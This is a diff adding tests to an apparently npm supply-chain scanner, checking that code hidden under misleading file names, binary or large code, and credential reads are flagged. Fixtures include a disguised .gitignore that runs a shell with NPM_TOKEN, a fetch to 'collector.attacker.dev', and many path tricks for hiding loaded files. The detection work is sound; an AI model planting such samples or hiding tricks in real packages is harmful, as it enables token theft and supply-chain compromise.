@@ -11,6 +11,7 @@ import { linesNote } from '../ui/view/file-runs-code.js'
 import { npmVersionManifest } from '../risk/npm/manifest.js'
 import { MAX_TAR_BYTES, npmTarballVersion } from '../risk/npm/tarball.js'
 import { npmFilesDiff } from '../risk/npm/diff.js'
+import { npmLoadedScripts } from '../risk/npm/files.js'
 import { npmCompareFindings } from '../risk/npm/compare.js'
 import { npmAddedDependency } from '../risk/npm/new-dependency.js'
 import { npmOldVersion } from '../risk/npm/old-version.js'
@@ -79,6 +80,8 @@ function store() {
 
 const version = (name, number, files, extra, published) => ({ ...packageOf(name, number, files, extra), published })
 const ids = assessment => assessment.findings.map(({ id }) => id)
+// A version holding `files`, as the viewer holds one.
+const holding = files => ({ kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
 
 // Upstream matches versions by npm's semver, borrowed from the npm beside
 // node, else its `semver` peer: a serverless function (Vercel) has no npm
@@ -104,6 +107,200 @@ test('a version alone: what it holds, its files stamped, too new under the minim
   assert.equal(DEFAULT_MINIMUM_RELEASE_AGE, 14 * DAY)
   assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW, downloads: false, minimumReleaseAge: 0 })).includes('too-new'), 'none under a minimum of 0, as own scopes take')
   assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW + 14 * DAY, downloads: false })).includes('too-new'), 'none once old enough')
+})
+
+// Node runs a file as JavaScript whatever its name where `require` loads it,
+// and where `import` does one with no extension; a package's `main`, and what
+// its `exports` and `imports` name, read as URLs. npm installs a .gitignore as
+// .npmignore.
+test('a file node runs as JavaScript though its name says otherwise, read as a script: one code loads, a main, what exports and imports name', async t => {
+  const runs = "require('child_process').exec(cmd)\n"
+  const minifiedCss = `${'.a{color:red;margin:0;padding:0}'.repeat(5)}\n`.repeat(20)
+  const files = {
+    'package.json': `\uFEFF${JSON.stringify({ name: 'loads', main: 'main.dat', exports: { '.': { require: './main.dat', import: './esm.mjs' }, './cfg': './cfg.conf', './feat/*': './feat/*.txt', './raw/*': './raw/*', './query': './query.txt?entry', './escaped': './escaped%2Etxt' }, imports: { '#own': './own.txt' } })}`,
+    'index.js': "require('./data.txt')\nrequire(`./.npmignore`)\nrequire('./lib')\nimport('./payload')\nimport('./styles.css')\nrequire('./conf.json')\nrequire('./theme.min.css')\n"
+      + "require('./esc\\x2etxt')\nrequire('./oct\\056txt')\nrequire('.\\\\win.txt')\nrequire('./up.JSON')\nrequire('./lower.json')\nrequire('./built' + '.txt')\nrequire('#own')\n",
+    'esm.mjs': "export { x } from './sub/next'\nimport y from './static.txt'\n",
+    'main.dat': runs, 'cfg.conf': runs, 'data.txt': `${runs}require('./more.cfg')\n`, 'more.cfg': runs, '.gitignore': runs, 'payload': runs, 'sub/next': runs,
+    'lib/package.json': '{"main":"entry.bin"}', 'lib/entry.bin': runs,
+    'styles.css': runs, 'conf.json': '{}', 'static.txt': runs, 'unloaded.txt': runs, 'README.md': runs,
+    'theme.min.css': minifiedCss, 'copy.min.css': minifiedCss,
+    'esc.txt': runs, 'oct.txt': runs, 'win.txt': runs, 'up.JSON': runs, 'lower.json': runs, 'built.txt': runs, 'own.txt': runs,
+    'feat/a.txt': runs, 'raw/tool': runs, 'raw/LICENSE': runs, 'raw/note.txt': runs, 'query.txt': runs, 'escaped.txt': runs,
+  }
+  npm(t, [{ name: 'loads', versions: [version('loads', '1.0.0', files, { dependencies: {}, scripts: {} }, ago(60))] }])
+  const assessment = await assessNpm('loads', '1.0.0', { now: NOW, downloads: false })
+  assert.deepEqual(assessment.findings.find(({ id }) => id === 'held-runs-code').files.map(({ path }) => path),
+    ['.gitignore', 'cfg.conf', 'data.txt', 'esc.txt', 'escaped.txt', 'feat/a.txt', 'lib/entry.bin', 'main.dat', 'more.cfg', 'oct.txt', 'own.txt', 'payload', 'query.txt', 'raw/tool', 'sub/next', 'up.JSON', 'win.txt'],
+    'not one `import` takes by an extension it doesn\'t know, JSON by its lowercase name, one built, '
+    + 'one an `exports` pattern naming nothing past its `*` reaches only by a name with an extension or prose\'s, nor one nothing loads')
+  assert.deepEqual(assessment.files['.gitignore'].stamps, [{ name: 'child_process', severity: 'high' }])
+  assert.deepEqual(assessment.files['unloaded.txt'].stamps, [])
+  assert.deepEqual(assessment.files['theme.min.css'].stamps, [{ name: 'Minified', severity: 'notice' }], 'a stylesheet code loads read as one all the same')
+  assert.deepEqual(assessment.files['theme.min.css'].stamps, assessment.files['copy.min.css'].stamps)
+})
+
+// A path a script writes out whole is read wherever it is in its text, as
+// code can be written to have its tokens read wrong (a regular expression, a
+// comment, a template's text taken for another); and as Windows and macOS
+// find a file by it, telling neither case nor Unicode's normalization apart.
+test('a path a script writes out whole read wherever it is: whatever takes it, in a template, a comment or a string, or by the package\'s own name', () => {
+  const index = [
+    "require('./extra.txt', 0)", "require(/* a */ './commented.txt')", "module.require('./module.txt')", "require?.('./optional.txt')", "require(('./paren.txt'))",
+    "`${require('./template.txt')}`", "`${/* } */ require('./brace.txt')}`", "`a ${`b` + require('./nested.txt')} c`", "x = a++ / require('./regex.txt') / 1",
+    "from\n'./split.txt'.split(',').forEach(require)", "require('@s/where/own.txt')", "require('../../@s/where/back.txt')", "require('../../@S/WHERE/folded.txt')", "require('@S/Where/named.txt')", "require('@s/where\\\\slashed.txt')", "require.resolve('./resolved.txt')",
+    "// require('./comment.txt')", "\"require('./quoted.txt')\"", "`docs: require('./prose.txt') ${kind}`",
+    "require(`./tmpl\\${x}.txt`)", "require(String.raw`./raw\\x2Etxt`)", "require('./lone\\uD800.txt')", "require('./cased.txt')", "require('./probed')", "require('./probedir')", "require('./bare')", "require('./both')", "require('./caf\\u00e9.txt')", "require('./hex\\X2Etxt')", "require('./uni\\U002Etxt')",
+    "require('../../@s/other/out.txt')", "import('./imported.txt')", "require(`./built${''}.txt`)",
+  ].join('\n')
+  const names = ['extra', 'commented', 'module', 'optional', 'paren', 'template', 'brace', 'nested', 'regex', 'split', 'own', 'back', 'folded', 'named', 'slashed', 'resolved', 'comment', 'quoted', 'prose', 'out', 'imported', 'built']
+  const cased = ['tmpl${x}.txt', 'raw\\x2Etxt', 'lone\uFFFD.txt', 'probed.JSON', 'probedir/index.JSON', 'bare/index.JSON', 'both', 'Cased.TXT', 'cafe\u0301.txt', 'hexX2Etxt', 'uniU002Etxt']
+  const files = { 'package.json': '{"name":"@s/where"}', 'index.js': index, 'bare/index': 'x', 'both.JSON': 'x', 'hex.txt': 'x', 'uni.txt': 'x', ...Object.fromEntries([...names.map(name => `${name}.txt`), ...cased].map(name => [name, 'x'])) }
+  assert.deepEqual([...npmLoadedScripts(holding(files))].toSorted(), [...names.slice(0, -3).map(name => `${name}.txt`), ...cased].toSorted(),
+    'a template\'s escaped `\\${` its text, a raw one\'s escapes as written, `\\X2E` `X2E`; as a filesystem telling neither case nor Unicode\'s normalization apart finds it too, by an extension `require` tries, and a lone surrogate as the U+FFFD node writes; not one leading out of the package, one `import` takes by an extension it doesn\'t know, nor one built')
+})
+
+test('a path `require` takes as a directory\'s alone, ending in `/` or in a `.` or `..` part: by its package.json `main`, not a file by its name', () => {
+  const files = { 'index.js': "require('./payload/')\nrequire('./conf/.')\nrequire('./up/x/..')\n", 'payload.json': '{}', 'payload/package.json': '{"main":"evil.txt"}', 'payload/evil.txt': 'x',
+    'conf.json': '{}', 'conf/package.json': '{"main":"run.txt"}', 'conf/run.txt': 'x', 'up.json': '{}', 'up/package.json': '{"main":"go.txt"}', 'up/go.txt': 'x', 'up/x/y.txt': 'x' }
+  assert.deepEqual([...npmLoadedScripts(holding(files))].toSorted(), ['conf/run.txt', 'payload/evil.txt', 'up/go.txt'])
+})
+
+test('a path `require` takes found as each filesystem finds it first: one telling case apart reaching a directory past a file only one folding case takes for it', () => {
+  const files = { 'index.js': "require('./dir')\n", 'DIR': 'x', 'dir/package.json': '{"main":"payload.txt"}', 'dir/payload.txt': 'x' }
+  assert.deepEqual([...npmLoadedScripts(holding(files))].toSorted(), ['DIR', 'dir/payload.txt'])
+})
+
+test('a `#` specifier a script names, as the package\'s `imports` map it, a pattern\'s naming nothing past its `*` too', () => {
+  const files = { 'package.json': JSON.stringify({ imports: { '#*': './*', '#fixed': './fixed.txt' } }), 'index.js': "require('#lib/payload.txt')\nimport('#lib/data.txt')\n",
+    'lib/payload.txt': 'x', 'lib/data.txt': 'x', 'lib/unnamed.txt': 'x', 'fixed.txt': 'x' }
+  assert.deepEqual([...npmLoadedScripts(holding(files))].toSorted(), ['fixed.txt', 'lib/payload.txt'], 'not one `import` takes by an extension it doesn\'t know, nor one no script names')
+})
+
+test('the package\'s own name as its `exports` map it, from code or an `imports` target', () => {
+  const files = { 'package.json': JSON.stringify({ name: 'p', exports: { '.': './index.js', './*': './lib/*' }, imports: { '#run': 'p/run.txt' } }),
+    'index.js': "require('#run')\nrequire('p/self.txt')\n", 'lib/run.txt': 'x', 'lib/self.txt': 'x', 'lib/unnamed.txt': 'x' }
+  assert.deepEqual([...npmLoadedScripts(holding(files))].toSorted(), ['lib/run.txt', 'lib/self.txt'], 'not one no code names')
+  const legacy = { 'package.json': JSON.stringify({ name: 'q', imports: { '#run': 'q/run.txt' } }), 'index.js': "require('#run')\n", 'run.txt': 'x', 'unnamed.txt': 'x' }
+  assert.deepEqual([...npmLoadedScripts(holding(legacy))], ['run.txt'], 'with no `exports`, by its path')
+  const closed = { 'package.json': JSON.stringify({ name: 'r', exports: { '.': './index.js' } }), 'index.js': "require('r/hidden.txt')\n", 'hidden.txt': 'x' }
+  assert.deepEqual([...npmLoadedScripts(holding(closed))], [], 'nor, with `exports`, a path they don\'t name')
+})
+
+test('a map that would put more in its target than any package does has every file read as one it may load, at once', () => {
+  const files = { 'package.json': JSON.stringify({ imports: { '#*': `./${'*'.repeat(70_000)}` } }), 'index.js': "require('#abcdef')\n", 'a.txt': 'x', 'b.dat': 'x' }
+  const started = performance.now()
+  assert.deepEqual([...npmLoadedScripts(holding(files))].toSorted(), ['a.txt', 'b.dat'])
+  assert.ok(performance.now() - started < 2000, 'not building what 70,000 `*` would hold')
+})
+
+test('a package naming more `exports` patterns than any does has every file read as one it may load', () => {
+  const exports = Object.fromEntries(Array.from({ length: 65 }, (_, at) => [`./p${at}/*`, `./p${at}/*.x`]))
+  const files = { 'package.json': JSON.stringify({ exports }), 'a.txt': 'x', 'b.json': '{}', 'c.js': 'x', 'p1/d.x': 'x' }
+  assert.deepEqual([...npmLoadedScripts(holding(files))].toSorted(), ['a.txt', 'p1/d.x'])
+  assert.deepEqual([...npmLoadedScripts(holding({ ...files, 'package.json': JSON.stringify({ exports: { './p1/*': './p1/*.x' } }) }))], ['p1/d.x'], 'as its patterns say, with fewer')
+})
+
+test('a `main` read with `\\` a separator too, as on Windows; an `exports` pattern\'s every `*` the same text, as node fills them', () => {
+  assert.deepEqual([...npmLoadedScripts(holding({ 'package.json': JSON.stringify({ main: 'lib\\payload.txt' }), 'lib/payload.txt': 'x' }))], ['lib/payload.txt'])
+  const files = { 'package.json': JSON.stringify({ exports: { './*': './lib/*/*.txt' } }), 'lib/x/x.txt': 'x', 'lib/x/y.txt': 'x', 'lib/ab/ab.txt': 'x' }
+  assert.deepEqual([...npmLoadedScripts(holding({ ...files, 'lib/a/a/.txt': 'x' }))].toSorted(), ['lib/a/a/.txt', 'lib/ab/ab.txt', 'lib/x/x.txt'],
+    'not `lib/x/y.txt`, which no request reaches; `lib/a/a/.txt` by `pkg/a/`, the filesystem folding the slashes it puts beside the pattern\'s')
+  assert.deepEqual([...npmLoadedScripts(holding({ 'package.json': JSON.stringify({ exports: { './*': './lib/*.txt' } }), 'lib/.txt': 'x' }))], ['lib/.txt'], 'by `pkg//`')
+  assert.deepEqual([...npmLoadedScripts(holding({ 'package.json': JSON.stringify({ exports: { '.': './lib/*.txt' }, imports: { '#x': './lib/*.txt' } }), 'lib/*.txt': 'x', 'lib/evil.txt': 'x' }))], ['lib/*.txt'],
+    'a `*` a key that is no pattern names as its own')
+})
+
+test('a `main` read past `imports` nested deeper than a call stack goes, as JSON and node read it', () => {
+  const manifest = `{"main":"payload.txt","imports":{"#deep":${'['.repeat(20_000)}${']'.repeat(20_000)}}}`
+  assert.deepEqual([...npmLoadedScripts(holding({ 'package.json': manifest, 'payload.txt': 'x' }))], ['payload.txt'])
+})
+
+test('a file new to a version that its code loads, though its name says otherwise, told as any script it adds: a .gitignore npm installs as the .npmignore it requires', async t => {
+  const meta = { dependencies: {}, scripts: {} }
+  const before = version('hides', '1.0.0', { 'package.json': '{}', 'index.js': 'module.exports = 1\n' }, meta, ago(60))
+  const after = version('hides', '1.0.1', { 'package.json': '{}', 'index.js': "require('./.npmignore')\n", '.gitignore': "require('child_process').exec(process.env.NPM_TOKEN)\n" }, meta, ago(40))
+  npm(t, [{ name: 'hides', versions: [before, after] }])
+  const { findings } = await assessNpm('hides', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
+  assert.deepEqual(findings, [
+    { id: 'held-runs-code', severity: 'critical', files: [{ path: '.gitignore', found: { 'child-process': [1] }, added: { 'child-process': [1] } }] },
+    { id: 'held-credentials', severity: 'critical', files: [{ path: '.gitignore', found: { tokens: [1] }, added: { tokens: [1] } }] },
+  ], 'red, as new to it')
+})
+
+test('a file new to a version that its code loads and that isn\'t text, told as code that isn\'t text: node runs it all the same', async t => {
+  const meta = { dependencies: {}, scripts: {} }
+  // Code, then a byte no UTF-8 has in a comment, which node decodes past.
+  const opaque = Buffer.concat([Buffer.from("require('child_process').exec(process.env.NPM_TOKEN) // "), Buffer.from([0xFF]), Buffer.from('\n')])
+  const before = version('opaque', '1.0.0', { 'package.json': '{}', 'index.js': 'module.exports = 1\n' }, meta, ago(60))
+  // An image, whose first bytes no UTF-8 has, which node can't parse.
+  const png = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x2F, 0x27])
+  const after = version('opaque', '1.0.1', { 'package.json': '{}', 'index.js': "require('./payload.txt')\nrequire('./icon.png')\n", 'payload.txt': opaque, 'image.dat': opaque, 'icon.png': png }, meta, ago(40))
+  npm(t, [{ name: 'opaque', versions: [before, after] }])
+  const { findings } = await assessNpm('opaque', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
+  assert.deepEqual(findings.find(({ id }) => id === 'binary-code'), { id: 'binary-code', severity: 'critical', files: [{ path: 'payload.txt', bytes: opaque.length }] },
+    'not a file nothing loads, nor an image code loads that node can\'t parse')
+})
+
+test('a file a version held alike that its code now loads, told as new: what node runs of it it didn\'t before', async t => {
+  const meta = { dependencies: {}, scripts: {} }
+  const opaque = Buffer.concat([Buffer.from("require('child_process').exec(cmd) // "), Buffer.from([0xFF]), Buffer.from('\n')])
+  const files = { 'package.json': '{}', 'data.txt': "require('child_process').exec(cmd)\nfetch('https://collector.attacker.dev/in')\n", 'payload.txt': opaque }
+  const before = version('wakes', '1.0.0', { ...files, 'index.js': 'module.exports = 1\n' }, meta, ago(60))
+  const after = version('wakes', '1.0.1', { ...files, 'index.js': "require('./data.txt')\nrequire('./payload.txt')\n" }, meta, ago(40))
+  npm(t, [{ name: 'wakes', versions: [before, after] }])
+  const { findings } = await assessNpm('wakes', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
+  assert.deepEqual(findings.filter(({ id }) => id.includes('runs-code') || id === 'binary-code'), [
+    { id: 'held-runs-code', severity: 'critical', files: [{ path: 'data.txt', found: { 'child-process': [1] }, added: { 'child-process': [1] } }] },
+    { id: 'binary-code', severity: 'critical', files: [{ path: 'payload.txt', bytes: opaque.length }] },
+  ], 'red, as new to what node runs')
+  assert.deepEqual(findings.find(({ id }) => id === 'new-hosts')?.hosts.map(({ host, path }) => [host, path]), [['collector.attacker.dev', 'data.txt']], 'and a host it names new')
+})
+
+test('a file a version held alike with a line no one writes, that its code now loads, told as now unreadable', async t => {
+  const meta = { dependencies: {}, scripts: {} }
+  const files = { 'package.json': '{}', 'notes.md': `# Notes\n${'x'.repeat(3000)}\n` }
+  const before = version('opaque-notes', '1.0.0', { ...files, 'index.js': 'module.exports = 1\n' }, meta, ago(60))
+  const after = version('opaque-notes', '1.0.1', { ...files, 'index.js': "require('./notes.md')\n" }, meta, ago(40))
+  npm(t, [{ name: 'opaque-notes', versions: [before, after] }])
+  const { findings } = await assessNpm('opaque-notes', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
+  assert.deepEqual(findings.find(({ id }) => id === 'now-unreadable'), { id: 'now-unreadable', severity: 'critical', files: [{ path: 'notes.md', was: 3000, now: 3000 }] },
+    'prose read as no script before, its line passed over')
+})
+
+test('a file a version changes as its code now loads it, told as newly loaded all the same: large code, now unreadable', async t => {
+  const meta = { dependencies: {}, scripts: {} }
+  const large = 'x = 1\n'.repeat(48 * 1024), long = `# Notes\n${'x'.repeat(3000)}\n`
+  const before = version('reworked', '1.0.0', { 'package.json': '{}', 'index.js': 'module.exports = 1\n', 'payload.txt': `${large}y`, 'notes.md': `${long}y` }, meta, ago(60))
+  const after = version('reworked', '1.0.1', { 'package.json': '{}', 'index.js': "require('./payload.txt')\nrequire('./notes.md')\n", 'payload.txt': `${large}z`, 'notes.md': `${long}z` }, meta, ago(40))
+  npm(t, [{ name: 'reworked', versions: [before, after] }])
+  const { findings } = await assessNpm('reworked', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
+  assert.deepEqual(findings.filter(({ id }) => id === 'large-code' || id === 'now-unreadable'), [
+    { id: 'large-code', severity: 'critical', files: [{ path: 'payload.txt', bytes: large.length + 1 }] },
+    { id: 'now-unreadable', severity: 'critical', files: [{ path: 'notes.md', was: 3000, now: 3000 }] },
+  ], 'a byte changed hides neither')
+  const moved = version('reworked', '1.0.2', { 'package.json': '{}', 'index.js': "require('./payload.txt')\nrequire('./notes.md')\n", 'lib/payload.js': `${large}z`, 'notes.md': `${long}z` }, meta, ago(30))
+  const renamed = version('reworked', '1.0.3', { 'package.json': '{}', 'index.js': "require('./payload.txt')\nrequire('./notes.md')\n", 'payload.txt': `${large}z`, 'notes.md': `${long}z` }, meta, ago(20))
+  npm(t, [{ name: 'reworked', versions: [before, after, moved, renamed] }])
+  assert.ok(!(await assessNpm('reworked', '1.0.3', { oldVersion: '1.0.2', now: NOW, downloads: false })).findings.some(({ id }) => id === 'large-code'),
+    'nor is one renamed from a script by its name, which ran before')
+  const blob = Buffer.concat([Buffer.from(large), Buffer.from('// '), Buffer.from([0xFF]), Buffer.from('\n')])
+  const binary = version('reworked', '1.0.4', { 'package.json': '{}', 'index.js': "require('./payload.txt')\n", 'lib/blob.js': blob }, meta, ago(10))
+  const unbinned = version('reworked', '1.0.5', { 'package.json': '{}', 'index.js': "require('./payload.txt')\n", 'payload.txt': blob }, meta, ago(5))
+  npm(t, [{ name: 'reworked', versions: [before, after, moved, renamed, binary, unbinned] }])
+  assert.ok(!(await assessNpm('reworked', '1.0.5', { oldVersion: '1.0.4', now: NOW, downloads: false })).findings.some(({ id }) => id === 'large-code'),
+    'one that isn\'t text by its name alone')
+})
+
+test('a file of 256 KiB or more that its code loads, told as large code whatever its name', async t => {
+  const meta = { dependencies: {}, scripts: {} }
+  const large = 'x = 1\n'.repeat(48 * 1024)
+  const before = version('heavy', '1.0.0', { 'package.json': '{}', 'index.js': 'module.exports = 1\n' }, meta, ago(60))
+  const after = version('heavy', '1.0.1', { 'package.json': '{}', 'index.js': "require('./payload.txt')\n", 'payload.txt': large, 'notes.txt': large }, meta, ago(40))
+  npm(t, [{ name: 'heavy', versions: [before, after] }])
+  const assessment = await assessNpm('heavy', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
+  assert.deepEqual(assessment.findings.find(({ id }) => id === 'large-code'), { id: 'large-code', severity: 'critical', files: [{ path: 'payload.txt', bytes: large.length }] }, 'not a file nothing loads')
+  assert.deepEqual([assessment.files['payload.txt'].stamps, assessment.files['notes.txt'].stamps], [[{ name: 'Large', severity: 'notice' }], []])
 })
 
 test('credentials a file reaches for, a finding of their own apart from the code it runs: red where new to it, orange where kept', async t => {
@@ -797,7 +994,8 @@ test('a tarball read as npm installs it, and two versions\' files paired as Comp
   const read = await npmTarballVersion(tgz)
   assert.deepEqual(read.json, { version: 3, sources: ['a/c.js', 'b.js', 'bin/tool', 'package.json'], sourcesContent: ['c', 'b', null, '{}'] }, 'sorted; one with a NUL no text')
   assert.equal(read.fileSizes.get('bin/tool'), 2)
-  assert.deepEqual(read.npmBinaries, new Map([['bin/tool', { size: 2, digest: `sha256-${createHash('sha256').update('\0\u0001').digest('base64')}` }]]), 'one not text told by its digest, as the server gives it')
+  assert.deepEqual(read.npmBinaries, new Map([['bin/tool', { size: 2, digest: `sha256-${createHash('sha256').update('\0\u0001').digest('base64')}`, runnable: false }]]),
+    'one not text told by its digest, as the server gives it, and whether node could run it, no NUL before it after a quote, a slash or a hashbang')
   const side = files => ({ kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
   const text = 'module.exports = function long() { return 42 }\n'.repeat(20)
   assert.deepEqual(npmFilesDiff(side({ 'old.js': text, 'same.js': 'x', 'edit.js': '1' }), side({ 'new.js': text, 'same.js': 'x', 'edit.js': '2', 'add.js': 'y' })),
